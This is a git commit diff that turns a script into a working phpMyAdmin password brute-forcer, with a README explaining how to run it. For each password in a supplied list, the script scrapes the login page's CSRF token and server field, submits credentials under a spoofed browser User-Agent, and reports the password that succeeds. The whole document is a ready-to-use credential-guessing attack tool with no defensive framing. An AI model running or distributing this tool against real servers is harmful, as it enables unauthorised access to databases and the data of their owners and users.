33541d9f10afe6698bcbf90094272f1d744cf5a4
Lukentui <mail@lukentui.ru>
2019-12-07 18:40:16 +0300

    partly ready

--- README.md
+++ README.md
@@ -1,2 +1,6 @@
-# phpmyadmin_brute
-Brute phpmyadmin accounts by username(must be known)+password list
+# How to use?
+- Run `pip3 install -r requirements.txt` for first time
+- Run `py brute.py -url http://localhost/phpmyadmin/ -user root -pswd passwords.txt`
+    - url  -> phpmyadmin login page url
+    - user -> mysql username
+    - pswd -> passwords list
--- brute.py
+++ brute.py
@@ -4,8 +4,19 @@
 
 from bs4 import BeautifulSoup
 from requests import get, post
+import argparse
+from terminaltables import AsciiTable
+from os import system
+from math import floor
 
-PHPMYADMIN_LOGIN_URL = "http://127.0.0.1/openserver/phpmyadmin/index.php"
+def banner():
+    """ Shows banner """
+    print(' ')	
+    print('  Usage: brute.py [options]')
+    print(' ')
+    print('  Example: python3 brute.py -url http://localhost/phpmyadmin/ -user root -pswd passwords.txt')
+    print('  -> to bruteforce root on http://localhost/phpmyadmin/ with passwords from passwords.txt(default passwords list)')
+    print('	')
 
 def parse_csrf_token(bs_tree: BeautifulSoup) -> str:
     """ Find csrf token """
@@ -15,26 +26,68 @@ def parse_server(bs_tree: BeautifulSoup) -> str:
     """ Find server number """
     return bs_tree.select_one("input[name='server']")["value"]
 
-def login(username: str, password: str, csrf_token: str, server_num: str) -> bool:
+def login(url:str, username: str, password: str, csrf_token: str, server_num: str) -> bool:
     """ Tries to sign in """
-    request = post(PHPMYADMIN_LOGIN_URL, data={
+    request = post(url, data={
         "pma_username": username,
         "pma_password": password,
         "server": server_num,
         "token": csrf_token,
         "target": "index.php",
+    }, headers={
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
     })
 
-    cookies = request.headers['Set-Cookie']
+    response_html = request.text
 
-    if "pmaAuth-1=deleted" in cookies:
+    # Error 1045 = login error
+    if "#1045" in response_html or "AllowNoPassword" in response_html:
         return False
 
     return True
 
-SOUP = BeautifulSoup(get(PHPMYADMIN_LOGIN_URL).text, "html.parser")
+def bruteforce(phpmyadmin_url:str, username:str, pswd_file:str) -> None:
+    """ Entry function """
+    PASSWORDS_COUNT:int = sum(1 for _ in open(pswd_file, "r", encoding="utf8"))
 
-SERVER = parse_server(SOUP)
-CSRF = parse_csrf_token(SOUP)
+    with open(pswd_file, "r", encoding="utf8") as file:
+        i:int = 0
 
-print(login("root", "", CSRF, SERVER))
+        for password in file:
+            i += 1
+
+            SOUP = BeautifulSoup(get(phpmyadmin_url).text, "html.parser")
+            password:str = password.strip()
+            SERVER:str = parse_server(SOUP)
+            CSRF:str = parse_csrf_token(SOUP)
+
+            attempt:bool = login(phpmyadmin_url, username, password, CSRF, SERVER)
+            attempts_field:str = "%s / %s" % (i, PASSWORDS_COUNT)
+
+            if attempt:
+                exit("READY: PASSWORD IS `%s`" % password)
+            
+            table_data:list = [
+                [ 'ATTEMPTS', 'LAST PASSWORD' ],
+                [ attempts_field, password ]
+            ]
+
+            system('cls')
+            print(AsciiTable(table_data).table)
+
+    print('PASSWORD NOT FOUND((')
+
+
+banner() #show banner
+
+# parser
+parser = argparse.ArgumentParser(description='PhpMyAdmin passwords bruteforce script, usage example: brute.py -url 127.0.0.1/phpmyadmin -user root -pswd passwords.txt')
+
+parser.add_argument('-url', action="store", help="phpmyadmin login page url", required=True)
+parser.add_argument('-user', action="store", help="mysql user", required=True)
+parser.add_argument('-pswd', action="store", help="file with passwords", required=True)
+
+args = parser.parse_args()
+
+# run if valid arguments
+bruteforce(args.url, args.user, args.pswd)
